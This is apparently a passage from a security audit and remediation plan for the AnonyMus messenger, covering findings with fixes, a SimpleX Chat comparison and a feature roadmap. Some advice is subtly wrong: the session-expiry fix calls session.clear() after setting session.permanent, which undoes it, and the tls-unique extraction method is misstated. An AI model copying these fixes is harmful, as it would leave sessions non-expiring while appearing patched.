**OWASP:** A07:2021 Identification and Authentication Failures
**File:** `transports/relay/server.py:373-389`

#### Description

The server enforces an 8-hour WebSocket session lifetime via `validate_session()`, but the Flask HTTP session cookie itself **never expires**. Once `session['username']` is set, it stays valid until the user explicitly logs out — even if the browser is closed and reopened days later. A stolen cookie (XSS, shared computer) remains valid indefinitely.

#### Fix

Set `PERMANENT_SESSION_LIFETIME` and use `session.permanent = True` on login.

```python
# transports/relay/server.py (FIXED)
from datetime import timedelta

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=8)
app.config['SESSION_REFRESH_EACH_REQUEST'] = True  # sliding expiry

@app.route('/login', methods=['POST'])
def login():
    # ... after successful auth ...
    session.permanent = True  # respects PERMANENT_SESSION_LIFETIME
    session.clear()
    session['username'] = user
    # ...
```

#### Ticket-Ready Task

> **[ANONYMUS-015] Add 8-hour session expiry**
>
> **Acceptance criteria:**
> - `PERMANENT_SESSION_LIFETIME` is 8 hours.
> - `session.permanent = True` set on login.
> - Integration test `tests/integration/test_session_expiry.py` asserts that a cookie older than 8 hours is rejected.
> - Sliding expiry documented in `docs/FEATURES.md`.
>
> **Effort:** 1 hour
> **Priority:** P1

---

## 7. Part III — Medium Findings (P2)

Medium findings should be fixed in months 2-3 (Q2). They are real bugs that degrade security or operability but are not immediately exploitable on their own.

### MED-1 — `RedactingFilter` Only Redacts `record.msg`, Not `record.args`

**File:** `core/logging.py`; `transports/relay/server.py:133-157`

The custom `RedactingFilter` scrubs UUIDs and Base64 strings ≥20 chars from the log message, but only from `record.msg` — the static format string. If the logger is called as `logger.warning("User %s failed login", secret_b64)`, the `secret_b64` is in `record.args` and is **not** redacted. It gets formatted into the final string at output time, bypassing the filter. The P2P server doesn't install the filter at all.

**Fix:** Override `filter()` to format the message first, then redact:

```python
class RedactingFilter(logging.Filter):
    PATTERN = re.compile(r'(?:[A-Za-z0-9+/]{20,}={0,2})|(?:[0-9a-f-]{36})')
    def filter(self, record):
        msg = record.getMessage()  # formats with args
        record.msg = self.PATTERN.sub('[REDACTED]', msg)
        record.args = ()
        return True
```

Install the filter on the root logger in both transports. Delete the duplicate inline copies.

**Effort:** 1.5 hours (including deleting duplicates and adding tests)

### MED-2 — SQLite `get_connection()` Opens a New Connection Per Call

**File:** `transports/p2p/database.py:33-37`

Every `get_connection()` call opens a brand-new SQLite file handle. Under load this is slow and increases lock contention despite WAL mode. There is no prepared-statement cache, no connection reuse.

**Fix:** Use a thread-local connection pool (or a single shared connection guarded by a lock, since P2P mode is single-process). For relay mode with PostgreSQL, the existing `ThreadedConnectionPool` is fine; for SQLite, use `sqlite3`'s built-in connection reuse via a `contextvars.ContextVar`-backed pool.

**Effort:** 3 hours

### MED-3 — No Indexes on `messages(peer_onion, timestamp)`

**File:** `transports/p2p/database.py:101-129`

`get_messages()` does `ORDER BY timestamp ASC` filtered by `peer_onion`. Without an index, this is a full table scan for every history load. A user with 10,000 messages with a peer waits seconds for the chat to open.

**Fix:** Add indexes as part of the first Alembic migration (HIGH-7):

```sql
CREATE INDEX idx_messages_peer_ts ON messages(peer_onion, timestamp);
CREATE INDEX idx_messages_ts ON messages(timestamp);
```

**Effort:** 30 minutes (within HIGH-7's migration work)

### MED-4 & MED-5 — Wildcard CORS in Debug (Relay) and Always (P2P)

**Files:** `transports/relay/server.py:206-207`; `transports/p2p/server.py:128`

Relay allows `CORS_ORIGINS="*"` when `FLASK_DEBUG=true`; P2P hardcodes `cors_allowed_origins="*"` unconditionally. An accidental `FLASK_DEBUG=true` in production (no assertion enforces otherwise) opens the WS gateway to any origin.

**Fix:** Assert `FLASK_DEBUG=False` in production (or when `ANONYMUS_ENV=production`); restrict CORS to a configured allowlist; never use `*` for WS.

**Effort:** 1 hour

### MED-6 — P2P Rate Limit Collapses Under Tor

**File:** `transports/p2p/server.py:534`

`/p2p/message` is rate-limited to 30/minute per IP. Under Tor, all peers egress through the local SOCKS5 proxy at `127.0.0.1`, so all peers share the same source IP — the limit collapses to **30/min total across all peers**, a severe DoS vulnerability for any user with more than a handful of contacts.

**Fix:** Rate-limit by a peer-specific token (e.g., the contact's onion address or a per-connection API key) rather than by source IP. For Tor specifically, also add a global cap to prevent a single malicious peer from exhausting the server.

**Effort:** 2 hours

### MED-7 — No JSON Schema Validation

**Files:** throughout `transports/p2p/server.py`

`request.get_json()` is called and `data.get(...)` is used directly. A POST with `null` values, missing keys, or wrong types passes through to the DB layer, where it either fails opaquely or causes silent corruption (e.g., `None` written to a `TEXT` column).

**Fix:** Use `marshmallow` (per HIGH-10) on every endpoint. Define a schema per route, validate on entry, return 400 with a structured error on failure.

**Effort:** 4 hours (combined with HIGH-10)

### MED-8 — No Global Flask Error Handler; Bare `except Exception` Throughout

**Files:** 30+ occurrences across `launcher/`, `transports/`, `core/`

Bare `except Exception` (and a few bare `except:`) swallow errors silently. Many do `pass`, so the caller has no idea the operation failed. There is no `@app.errorhandler(Exception)`, so an unhandled exception returns Flask's default HTML traceback (in debug) or a generic "Internal Server Error" (in prod) — neither of which is a structured JSON response.

**Fix:** Add a global error handler that logs the stack trace server-side and returns a structured JSON 500. Remove bare `except Exception` blocks; replace with specific exception types. Where a broad catch is genuinely necessary (e.g., Tor process management), at minimum log the exception.

```python
@app.errorhandler(Exception)
def handle_unexpected(e):
    app.logger.exception("Unhandled exception on %s %s", request.method, request.path)
    return jsonify({'error': 'internal_server_error', 'request_id': g.request_id}), 500
```

**Effort:** 6 hours (because of the 30+ call sites)

### MED-9 — `print()` Used 30+ Times, Bypasses `RedactingFilter`

**Files:** throughout

`print()` bypasses the logging system entirely, so the `RedactingFilter` never sees the output. Sensitive data (onion addresses, error messages containing keys) can leak to stdout, which may be captured by systemd-journald, Docker logs, or a shell redirect.

**Fix:** `grep -rn 'print(' transports/ core/ launcher/` and replace each with `app.logger.info()` / `.warning()` / `.error()` as appropriate. Add a lint rule (flake8 `T20` plugin) to forbid `print` in non-test code.

**Effort:** 2 hours

### MED-10 — `is_recipient_online()` False Negative with Redis + Multi-Worker

**File:** `transports/relay/server.py:307-329`

`is_recipient_online()` checks `socket_connect_times` (an in-memory dict). With Redis enabled and multiple workers, a recipient connected to worker A appears online in Redis but absent from worker B's `socket_connect_times` — worker B then emits `push_queue_error: recipient_offline` incorrectly, dropping a message the recipient would have received.

**Fix:** Use Redis as the source of truth for online presence. `is_recipient_online()` should query Redis, not the local dict. The in-memory dict can be a fast-path cache, but a Redis miss + Redis hit must not return `False`.

**Effort:** 2 hours

### MED-11 — `/api/reset-data` Wipes DB on Single POST

**File:** `transports/p2p/server.py:453-459`

A single POST to `/api/reset-data` wipes the entire local DB. With HIGH-3 (no CSRF) unfixed, an attacker can trick the victim's browser into POSTing and cause irreversible data loss. Even with CSRF fixed, an accidental click on a malicious bookmark is dangerous.

**Fix:** Require (a) CSRF token (HIGH-3), (b) a confirmation token (re-enter password or type "DELETE"), and (c) a 10-second delay with a cancel button on the client. Log the operation with the requester's IP and timestamp.

**Effort:** 2 hours

### MED-12 — `SESSION_COOKIE_SECURE=False` Hardcoded in P2P

**File:** `transports/p2p/server.py:75-76`

The comment says "local browser connects via HTTP" — true, since P2P mode serves loopback over plain HTTP. But the cookie still contains `db_key` (pre-CRIT-2 fix), so a local process sniffing loopback can read it. After CRIT-2 is fixed (db_key moved server-side), the cookie contains only an opaque session ID, which is less catastrophic but still worth protecting.

**Fix:** After CRIT-2, the cookie carries only an opaque ID, so `Secure=False` is acceptable for P2P (loopback HTTP). Document this explicitly. For relay mode, `Secure=True` always.

**Effort:** 30 minutes (mostly documentation)

### MED-13 — `queue_owners` In-Memory Dict Diverges Under Multi-Worker

**File:** `transports/relay/server.py:225-228`

The Dockerfile hardcodes `-w 1` (single worker), but nothing enforces this. If an operator bumps `-w 4` for throughput, each worker has its own `queue_owners` dict, and queue ownership diverges — messages get misrouted.

**Fix:** Move `queue_owners` to Redis (when configured). If Redis is not configured, assert single-worker at startup and refuse to boot otherwise.

**Effort:** 3 hours

### MED-14 — No Password Reset / Account Lockout / Failed-Attempt Throttling

**File:** `transports/relay/server.py:493`

The only brute-force defense is the global rate limit (`10/minute` on `/login`). A botnet rotating IPs can brute-force at 10 req/min/IP indefinitely. There is no account lockout after N failed attempts, no password reset flow, no MFA.

**Fix:** Add (a) per-account failed-attempt counter with exponential backoff (lock for 1 min after 5 fails, 5 min after 10, 30 min after 20), (b) a password-reset-via-security-question or out-of-band-email flow (if email is collected — AnonyMus does not collect emails, so this may be a "reset via recovery code" flow instead), (c) optional TOTP MFA.

**Effort:** 8 hours

### MED-15 — Android `e.printStackTrace()` Leaks Crypto Stack Traces

**Files:** `android/.../JceCryptoProvider.kt:159`; `crypto_utils.kt:197`; `setup_screen.kt:208`

`e.printStackTrace()` writes to logcat, which other apps with `READ_LOGS` permission (granted to system apps and some pre-installed bloatware) can read. Stack traces from crypto code reveal provider names, algorithm choices, and internal state — useful to an attacker crafting a follow-up exploit.

**Fix:** Replace all `e.printStackTrace()` with `Timber.e(e, "context message")`. Configure Timber to strip stack traces in release builds (`BuildConfig.DEBUG` gate). ProGuard already strips `Log.v/d` — extend to `Log.w/e` in release.

**Effort:** 1.5 hours

### MED-16 — `ThreadPoolExecutor(max_workers=20)` Unbounded Queue

**File:** `transports/p2p/server.py:138`

Outbound Tor requests use a fixed 20-thread pool with an unbounded queue. Under load, 20 concurrent Tor circuits can exhaust the daemon's file descriptors, and the unbounded queue can grow to consume all available memory.

**Fix:** Bound the queue (e.g., `maxsize=100`); on `QueueFull`, apply backpressure to the caller (return 503 Retry-After). Monitor pool utilization in `/metrics`.

**Effort:** 2 hours

### MED-17 — mDNS Broadcasts Service Existence on LAN

**File:** `transports/relay/server.py:102-130`

mDNS advertises `_anonymus._tcp.local.` on the LAN. For a privacy app, this leaks the service's existence to anyone on the network — a corporate network admin, a coffee-shop snooper, or a hostile roommate can detect that AnonyMus is running.

**Fix:** Default `ANONYMUS_MDNS=false`. When the user explicitly enables it, show a warning dialog: "This will make AnonyMus visible to other devices on your local network. Continue?"

**Effort:** 1 hour

### MED-18 — `androidx.security.crypto:1.1.0-alpha06` Is Alpha

**File:** `android/gradle/libs.versions.toml`

The `androidx.security.crypto` library is at `1.1.0-alpha06` — an alpha release. Google explicitly warns: "The API is not stable and may change without notice." A breaking change in a future alpha could corrupt `EncryptedSharedPreferences` data.

**Fix:** Pin to `1.0.0` (stable). If `1.1.0` features are required (e.g., Tink-backed `MasterKey`), migrate to Tink's `AndroidKeysetManager` directly, which is stable.

**Effort:** 2 hours (mostly testing that the migration does not corrupt existing prefs)

### MED-19 — Docker `-w 1` Hardcodes Single Worker

**File:** `build/Dockerfile`

`CMD ["gunicorn", "--worker-class", "eventlet", "-w", "1", ...]` hardcodes a single worker. The README says Redis enables multi-worker, but the Dockerfile never allows it. Operators who bump `-w` manually hit MED-13.

**Fix:** Read `WEB_CONCURRENCY` from env (default 1, allow override). Document that multi-worker requires Redis. Add a startup assertion that refuses to boot with `-w > 1` if Redis is not configured.

**Effort:** 1 hour

### MED-20 — Docker Image Leaves `build-essential` in Final Image; No `.dockerignore`

**File:** `build/Dockerfile`

The final image includes `build-essential`, `libffi-dev`, `libssl-dev`, `libpq-dev` — all needed only at pip-install time. The image is ~800 MB instead of ~200 MB. No `.dockerignore` means `COPY . .` ships `.git/`, `tests/`, `docs/`, `*.pdf` into the image.

**Fix:** Multi-stage build: builder stage installs deps, runtime stage is `python:3.11-slim` with only the installed wheels. Add `.dockerignore` excluding `.git/`, `tests/`, `docs/`, `*.pdf`, `*.md`, `launcher/`, `android/`.

**Effort:** 2 hours

### MED-21 — `psycopg2-binary` Used in Production

**File:** `requirements.txt:8`

psycopg2 authors explicitly warn: "The binary package is a practical choice for development and testing but in production it is advised to use the package built from sources." The binary wheel bundles its own libpq, which may not receive security patches unless psycopg2-binary itself is updated.

**Fix:** Switch to `psycopg2` (built from source) in production, or migrate to `psycopg[binary]` v3 (the maintained successor). For Docker, the build stage installs `libpq-dev` and compiles from source; the runtime stage copies the compiled `.so`.

**Effort:** 1.5 hours

---

## 8. Part IV — Low Findings (P3)

Low findings are code quality, minor hardening, or documentation issues. Fix them opportunistically during related work, or batch them in a "code quality sprint" at the end of Q2.

### LOW-1 through LOW-5 — Security Headers & Cookie Flags

Missing `SESSION_COOKIE_SECURE` (LOW-1, dup of MED-12), homoglyph-prone username regex (LOW-2), HSTS only on `is_secure` (LOW-3), CSP allowing `unsafe-inline` and `ws:` (LOW-4), missing COOP/COEP/CORP (LOW-5).

**Fix:** Add the missing headers in the centralized `core/security_headers.py` (which is currently dead code — see LOW-6); import it from both transports; delete the inline duplicates. Tighten CSP to `default-src 'self'; connect-src 'self' wss://<relay-host>;` (no wildcard `ws:`). Set HSTS whenever the request comes through a trusted proxy (check `X-Forwarded-Proto: https`).

**Effort:** 3 hours (combined)

### LOW-6, LOW-7, LOW-8, LOW-9 — Dead Code & Duplication

`core/security_headers.py` is never imported (LOW-6). `core/crypto.py` duplicates `transports/p2p/database.py:40-88` byte-for-byte (LOW-7). `RedactingFilter` is defined in three places (LOW-8). `socketio = relay_sio` is a hack (LOW-9).

**Fix:** Consolidate. Delete `core/crypto.py`; use `transports/p2p/database.py`'s copy (or move both to a new `core/crypto.py` and import everywhere). Delete `core/security_headers.py` if unused, or actually use it. Pick one `RedactingFilter` location (probably `core/logging.py`) and import everywhere. Replace the `socketio = relay_sio` hack with a `get_socketio()` helper that returns the active instance.

**Effort:** 3 hours

### LOW-10 — WS Payload Cap Mismatch

WS handler enforces a 100 KB cap per event, but `MAX_CONTENT_LENGTH=1 MB` applies only to HTTP. A malicious WS client can send 1 MB JSON payloads at 10 events/second = 10 MB/s flood.

**Fix:** Lower the per-event cap to match the realistic max message size (e.g., 200 KB after padding). Add a global WS byte-per-second cap.

**Effort:** 1 hour

### LOW-11 & LOW-12 — Performance

No static asset caching (LOW-11); no pagination on `/api/messages` (LOW-12).

**Fix:** Add `Cache-Control: public, max-age=31536000, immutable` to hashed static assets. Add `?limit=50&before=<ts>` pagination to `/api/messages`; client lazy-loads older messages on scroll-up.

**Effort:** 3 hours

### LOW-13 — Accessibility

Login inputs lack `<label for=>` association; chat input has placeholder but no label.

**Fix:** Add explicit `<label for="username">Username</label>` and `id="username"` to each input. Add `aria-label` to icon-only buttons. Test with a screen reader (NVDA on Windows, VoiceOver on macOS).

**Effort:** 1.5 hours

### LOW-14, LOW-15, LOW-16 — Dependency Hygiene

`python-dotenv==1.2.2` unusual version (LOW-14). Android Kotlin 2.3.20 / AGP 9.0.1 / Compose BOM 2026.03.01 are future/alpha (LOW-15). qrcodejs 1.0.0 abandoned (LOW-16).

**Fix:** Pin `python-dotenv==1.0.1` (or latest stable 1.x). Pin Android Kotlin to a stable release (e.g., 2.0.21), AGP to 8.7.x, Compose BOM to 2024.10.x. Replace qrcodejs with `qrcode` npm package (or `qrcode-generator`).

**Effort:** 2 hours

### LOW-17, LOW-18, LOW-19, LOW-20 — Documentation & Installer

No `SECURITY.md`, `CONTRIBUTING.md`, `CHANGELOG.md` (LOW-17). README links use `file:///c:/Users/Aryan/...` paths (LOW-18). `docs/FEATURES.md` claims "secure-wiping uninstaller" but Inno Setup uses `DelTree` (LOW-19). Uninstaller does not secure-wipe (LOW-20).

**Fix:** Add `SECURITY.md` (with PGP key, severity matrix, disclosure policy — see Section 14), `CONTRIBUTING.md` (with code style, commit format, PR checklist), `CHANGELOG.md` (auto-generated from conventional commits). Fix README links to be relative. Either implement real secure-wipe (overwrite with random bytes 3× before delete — though this is ineffective on SSDs with wear-leveling; document the limitation honestly) or remove the "secure-wipe" claim from the docs.

**Effort:** 4 hours

---

## 9. SimpleX Chat Benchmark & Comparison

SimpleX Chat is the leading metadata-resistant messenger. It has been audited twice by Trail of Bits (November 2022 implementation assessment, July 2024 cryptographic design review), ships 78 dated design RFCs, publishes transparency reports, and has a stated design principle that is unique among messengers: **no user identifiers of any kind**. This section benchmarks AnonyMus against SimpleX across 15 dimensions, and the next section (10) maps every SimpleX feature to a concrete AnonyMus integration path.

### 9.1 Side-by-Side Comparison

| Dimension | AnonyMus (current) | SimpleX Chat | Recommended AnonyMus Path |
|---|---|---|---|
| **User identifiers** | Username (relay) or onion address (P2P) — correlatable across contacts | None — pairwise per-connection queue addresses | Migrate to per-connection pairwise pseudonyms (Section 10.A) |
| **E2E encryption layers** | Single layer: AES-256-GCM with HKDF-SHA256 chain ratchet | Three layers: Double Ratchet + per-queue NaCl cryptobox + server→recipient NaCl layer | Add Double Ratchet with DH ratchet + per-queue NaCl cryptobox (Section 10.B) |
| **Forward secrecy** | Symmetric-key ratchet only — chain-key compromise exposes all future messages until next ECDH | Double Ratchet with DH ratchet on every message — full forward secrecy + post-compromise security | Upgrade to Double Ratchet (Section 10.B) |
| **Post-quantum resistance** | None | PQ key exchange on every ratchet step (since v5.6, March 2024) | Add PQ hybrid key exchange (Section 10.B) |
| **Metadata handling** | Timestamp inside AAD (good); size padding to 512-byte blocks (good); mDNS leaks existence (bad) | All metadata inside encrypted envelope; fixed-size 16 KB transport blocks; no ciphertext in common between sent/received | Move all metadata inside envelope; adopt 16 KB blocks; kill mDNS default (Section 10.B) |
| **Server data retention** | SQLite/Postgres user table (relays know who has an account) | In-memory message storage; delete-after-delivery; no user records | Make relay servers in-memory + delete-on-delivery (Section 10.C) |
| **Replay protection** | AAD binds `seq` — client-side check only | `tlsunique` channel binding (RFC 5929) signed with per-queue ephemeral key | Add `tlsunique` channel binding (Section 10.B) |
| **Out-of-band verification** | Invite link carries ECDH public key (good) but no safety-number verification | Security code / QR verification per contact | Add safety-number verification (Section 10.B) |
| **File transfer** | None | XFTP protocol — chunked (≤15,780 B), E2E, recipient-chosen relays, up to 1 GB | Build XFTP-style file protocol (Section 10.E) |
| **Groups** | None | Decentralized — pairwise queues to every member; group links with rotating IDs; member roles; member relations vector | Build decentralized groups (Section 10.F) |
| **Voice/video** | None | E2E WebRTC; signalling via chat protocol `x.call.*`; video + voice messages | Add WebRTC voice/video (Section 10.G) |
| **Push notifications** | None | Android: background service (no Google tokens); iOS: dedicated push server with optional 3rd queue address; NSE decrypts minimal data | Add privacy-preserving push (Section 10.H) |
| **Multi-device** | None | XRCP protocol — QR + multicast/reverse-HTTP; quantum-resistant linking (v5.4) | Build XRCP-style multi-device (Section 10.I) |
| **Transparency** | None | Published transparency reports (2025: 12 requests, 0 responsive data); PGP security contact | Add transparency page + SECURITY.md (Section 10.K) |
| **Audits** | None | Two Trail of Bits audits (2022, 2024), both published with findings + fixes | Budget for external crypto audit at month 6 (Section 14) |
| **Reproducible builds** | None | Server builds reproducible; scheduled verification workflow | Add reproducible build CI job (Section 10.K) |
| **Design RFCs** | None | 78 dated RFCs in `docs/rfcs/` | Start `docs/rfcs/` design log (Section 10.K) |
| **Self-hosting** | Docker only (relay) | One-script install; Docker; Linode marketplace; onion-only option | Make relay one-command self-hostable (Section 10.C) |
| **Multi-platform** | Web + Android (alpha) + Windows launcher | iOS + Android + Desktop (DMG/MSI/DEB) + Terminal CLI + Web + SDKs (TS, Node, Python) | Add iOS, Desktop, CLI, SDKs (Section 10.J) |
| **Decentralization** | P2P over Tor (each peer is a node) | Fragmented relay network — anyone runs servers; clients pick per-connection; servers don't talk to each other | Keep Tor P2P; add fragmented relay network mode (Section 10.C) |

### 9.2 What Makes SimpleX Defensible

The single most defensible claim SimpleX makes — and the one AnonyMus should adopt as its north star — is: **no other messenger prevents two of your contacts from proving they are talking to the same person.** This is structurally impossible in Signal (phone number is shared across all contacts), WhatsApp (phone number), Matrix (user ID), and even Session (Session ID). SimpleX achieves it by:

1. **No user identifiers.** There is no phone, email, username, public key, or random ID that is shared across conversations.
2. **Pairwise per-connection queues.** Each conversation uses a fresh pair of unidirectional queues on a relay server, with per-queue addresses known only to the two participants.
3. **Out-of-band key exchange.** Connection invitations are passed via a link/QR code outside the network, defeating MITM by the provider.
4. **No server-to-server communication.** Relay servers are isolated; there is no global namespace, no server discovery, no federation.
5. **No ciphertext in common between sent and received traffic.** An additional NaCl cryptobox layer ensures that even if TLS is compromised, the same plaintext never produces the same ciphertext across queues.

AnonyMus currently has identity correlation in both modes: the relay-mode username is shared across all of a user's contacts, and the P2P-mode onion address is shared across all of a user's contacts. Either is sufficient to let two contacts prove they are talking to the same person. The ambitious integration plan in Section 10.A addresses this directly.

### 9.3 What AnonyMus Has That SimpleX Does Not

AnonyMus is not a subset of SimpleX — it has features SimpleX lacks:

- **Dual-mode architecture (relay + Tor P2P).** SimpleX is relay-only; AnonyMus lets each user run their own Tor hidden service for true serverless P2P. This is a meaningful differentiator for users who do not trust any relay operator.
- **Camouflage Windows launcher.** AnonyMus disguises itself as "Network Diagnostics Utility" — useful for users in hostile environments who need plausible deniability. SimpleX has no equivalent.
- **Biometric lock with `BIOMETRIC_STRONG | DEVICE_CREDENTIAL`.** AnonyMus's Android biometric gating is more restrictive than SimpleX's.
- **TOFU certificate pinning on Android.** Per-host SPKI SHA-256 pinning, more granular than SimpleX's TLS-only approach.
- **`FLAG_SECURE` anti-screenshot.** AnonyMus sets this on Android; SimpleX does not (it relies on the OS-level screenshot block).

The integration plan must preserve all five of these differentiators. None of them conflict with the SimpleX features being added.

---

## 10. Ambitious Feature Integration Plan — All SimpleX Features into AnonyMus

This is the core of the ambitious scope. Every feature SimpleX ships is mapped to a concrete AnonyMus integration path that **does not conflict with the existing architecture** (dual-mode WSGI dispatcher, Tor P2P, camouflage launcher, biometric lock, TOFU pinning, `FLAG_SECURE`). The features are grouped into 11 sub-sections (A through K). For each feature: what it is, why it matters, how it fits AnonyMus, implementation approach, dependencies, effort estimate, and target quarter.

The total effort is large — roughly 6 months of focused work for a 2-3 engineer team — but the result is an AnonyMus that is feature-complete against SimpleX while retaining its unique differentiators.

### 10.A — Identifier & Privacy Model

#### 10.A.1 — Pairwise Per-Connection Pseudonyms (No User IDs)

**What it is:** In SimpleX, each conversation uses a fresh pair of unidirectional queues with per-queue addresses known only to the two participants. There is no globally correlatable identifier shared between any two of a user's conversations.

**Why it matters:** This is the single highest-leverage privacy upgrade. Without it, two contacts can prove they are talking to the same person. With it, they cannot.

**How it fits AnonyMus:** AnonyMus's relay mode currently uses a `users(username PRIMARY KEY)` table — a globally correlatable identifier. The migration introduces a `connections` table where each row is a fresh `(conn_id, recipient_alias, sender_alias, queue_address, key_material)` tuple, with no foreign key to a `users` table. Auth becomes per-connection rather than per-user: the user authenticates to their local client (password → unlocks local keystore), and the client authenticates to each queue with a per-queue credential. In P2P mode, the onion address is already per-peer (each peer runs their own hidden service), but the same onion address is reused across all contacts — this must change. Each contact gets a fresh onion address derived from a fresh ED25519 keypair, with the Tor hidden service configured to serve multiple addresses on the same port.

**Implementation approach:**
- New schema: `connections(conn_id, peer_alias, queue_addr, e2e_pubkey, created_at, last_used)` — no FK to users.
- New `/api/connections/create` endpoint generates a fresh queue + keypair, returns an invite link.
- Invite link format: `anonymus://#c=<conn_id>&k=<e2e_pubkey>&r=<relay_or_onion>&s=<sig>` — all in the URL fragment (never sent to server).
- Client decrypts invite, generates its own keypair, establishes E2E.
- Migration: existing `users` table is kept for backward compat during a deprecation window; new connections use the new schema; old connections are migrated lazily on next contact.

**Dependencies:** 10.B (layered E2E) for the per-queue cryptobox; 10.C (server data minimization) so the relay does not log `conn_id` correlations.

**Effort:** 3 weeks (schema migration + invite flow + client changes + tests)
**Target quarter:** Q2 (months 3-4)

#### 10.A.2 — Incognito Mode (Random Name Per Contact)

**What it is:** SimpleX lets the user set a random display name per contact, so even the display name does not correlate across conversations.

**Why it matters:** Defense in depth against social-graph correlation — even if the user picks the same random name twice by accident, the underlying queue addresses are different.

**How it fits AnonyMus:** Trivial extension of 10.A.1 — the `connections` table gets a `display_name` column, defaulted to a random 8-char string. The user can override per-connection.

**Effort:** 2 days
**Target quarter:** Q2

#### 10.A.3 — Hidden Profiles

**What it is:** SimpleX lets the user create multiple profiles per database, each with its own display name and avatar, and switch between them. Profiles can be "hidden" — accessible only via a passphrase, hidden from the main UI.

**Why it matters:** A user under duress can reveal a "decoy" profile while keeping their real profile hidden. This is the same threat model as Veracrypt hidden volumes.

**How it fits AnonyMus:** The local DB gets a `profiles(profile_id, display_name, avatar, hidden, passphrase_hash)` table. Each `connection` belongs to a `profile_id`. Hidden profiles are only listed after the user enters the profile's passphrase. The camouflage launcher (existing feature) is the perfect host for this — a user who launches "Network Diagnostics Utility" and enters the right passphrase sees their real profile; entering the wrong passphrase sees the decoy.

**Effort:** 1 week
**Target quarter:** Q3 (month 5)

#### 10.A.4 — Multiple Profiles Per DB

**What it is:** (Same as 10.A.3 minus the "hidden" aspect — the user can have multiple named profiles, each with its own contacts, all in one encrypted DB.)

**Why it matters:** A user might want a "work" profile and a "personal" profile, with separate contact lists, all unlockable with one password.

**How it fits AnonyMus:** Subsumed by 10.A.3 — `hidden=False` for the regular case.

**Effort:** (Included in 10.A.3)

### 10.B — Cryptographic Upgrades

#### 10.B.1 — Layered E2E: Double Ratchet + Per-Queue NaCl Cryptobox

**What it is:** SimpleX uses three E2E layers: (1) Double Ratchet per conversation for forward secrecy + post-compromise security, (2) per-queue NaCl cryptobox so the same plaintext never produces the same ciphertext across queues, (3) second NaCl layer on server→recipient delivery so no ciphertext is in common between a server's sent and received traffic inside TLS.

**Why it matters:** AnonyMus's current single-layer AES-256-GCM with HKDF chain ratchet lacks a DH ratchet — chain-key compromise exposes all future messages until the next ECDH. The per-queue cryptobox layer prevents ciphertext correlation if TLS is compromised.

**How it fits AnonyMus:** Replace `core/crypto.py`'s chain ratchet with the Double Ratchet (use the `cryptography` library's X25519 + HKDF-SHA256, or vendor the `oml`/`pyaxolotl` reference implementation). Add a per-queue NaCl cryptobox layer using `PyNaCl`'s `nacl.public.Box`. The existing AAD binding (role+seq+session-id+protocol-version) is preserved as the innermost layer's AAD.

**Implementation approach:**
- New module `core/double_ratchet.py` implementing the Double Ratchet per the Signal spec.
- New module `core/queue_cryptobox.py` wrapping `nacl.public.Box` with per-queue keys.
- The existing `web/static/crypto.js` is rewritten to mirror the Python layer (Web Crypto API for X25519 + HKDF; a JS NaCl library for the cryptobox).
- The Android client uses Tink's Double Ratchet (or `com.virgilsecurity:purekit` if Tink lacks it).
- The protocol version is bumped to `v2`; v1 clients are supported during a deprecation window via a `protocol_version` field in the message envelope.

**Dependencies:** 10.A.1 (per-connection keys make per-queue cryptobox natural).

**Effort:** 4 weeks (DR implementation + cross-platform parity + tests + migration)
**Target quarter:** Q2 (months 3-4)

#### 10.B.2 — Post-Quantum Key Exchange on Every Ratchet Step

**What it is:** SimpleX adds PQ (ML-KEM-style) keys to the SMP agent message envelope on every ratchet step, providing "harvest now, decrypt later" resistance against future quantum computers.

**Why it matters:** A state actor recording ciphertext today can decrypt it in 10-20 years when large-scale quantum computers arrive. PQ key exchange makes that recording useless.

**How it fits AnonyMus:** Use a hybrid X25519 + ML-KEM-768 key exchange (the NIST-standardized PQ KEM). The `cryptography` library does not yet ship ML-KEM (as of late 2025); use `liboqs-python` (the Open Quantum Safe project's Python bindings). For the web client, use `liboqs-js` compiled to WASM. For Android, use `liboqs-jni`.

**Implementation approach:**
- New module `core/pq_kem.py` wrapping `liboqs-python`'s ML-KEM-768.
- The Double Ratchet's DH ratchet step becomes a hybrid X25519 + ML-KEM-768 step.
- The message envelope grows by ~1.2 KB per PQ key — adopt SimpleX's compressed message format to fit in 16 KB transport blocks.
- A/B test performance on low-end Android (ML-KEM-768 is ~5ms on a 2020 phone).

**Dependencies:** 10.B.1 (Double Ratchet); a compressed message format.

**Effort:** 3 weeks
**Target quarter:** Q3 (month 6) — after the core DR is stable

#### 10.B.3 — `tlsunique` Channel Binding for Replay Protection

**What it is:** SimpleX requires `tlsunique` (RFC 5929) channel binding as the session ID in each client command, signed with a per-queue ephemeral key. This ties each message to a specific TLS session, preventing replay across sessions.

**Why it matters:** AnonyMus's current replay protection is client-side (sequence number check). A server-side check tied to the TLS session is much stronger.

**How it fits AnonyMus:** Extract `tlsunique` from the TLS session (the `ssl` module exposes this as `SSLSession.get_ticket()` or via `SSLObject.session()`). For the relay, gunicorn + eventlet may not expose `tlsunique` directly — switch to `uvicorn` + `httpx` if needed, or front with Caddy which can inject `tlsunique` as a header. For P2P over Tor, `tlsunique` is the Tor circuit's channel binding.

**Effort:** 2 weeks
**Target quarter:** Q2

#### 10.B.4 — Content Padding & Fixed-Size 16 KB Transport Blocks

**What it is:** SimpleX pads messages to fixed 16 KB transport blocks, blunting size-based traffic analysis.

**Why it matters:** AnonyMus's current 512-byte block padding is good but not enough — an adversary observing the relay can still distinguish a 1-block from a 4-block message. Fixed 16 KB blocks make every message look identical.

**How it fits AnonyMus:** The message envelope is padded to a multiple of 16 KB before encryption. Short messages occupy one block; long messages span multiple blocks with the block count also hidden via random-length dummy padding. The bandwidth overhead is significant (~16 KB per message) — make this opt-in for high-security mode, with the default at 1 KB blocks.

**Effort:** 1 week
**Target quarter:** Q2

#### 10.B.5 — Out-of-Band Connection Verification (Safety Number / QR)

**What it is:** SimpleX lets two contacts verify their connection by comparing a safety number (a short numeric fingerprint of the E2E keys) in person or via a separate channel.

**Why it matters:** Defeats MITM by the relay operator — if the relay substituted its own keys during the initial exchange, the safety numbers will not match.

**How it fits AnonyMus:** Compute a safety number as `SHA256(my_pubkey || peer_pubkey)` truncated to 60 digits, displayed as 12 groups of 5. The web and Android clients show a "Verify safety number" button on each contact; both sides should see the same number. Add a QR code for easy scanning.

**Effort:** 3 days
**Target quarter:** Q2

### 10.C — Server Architecture & Data Minimization

#### 10.C.1 — In-Memory Message Storage + Delete-on-Delivery

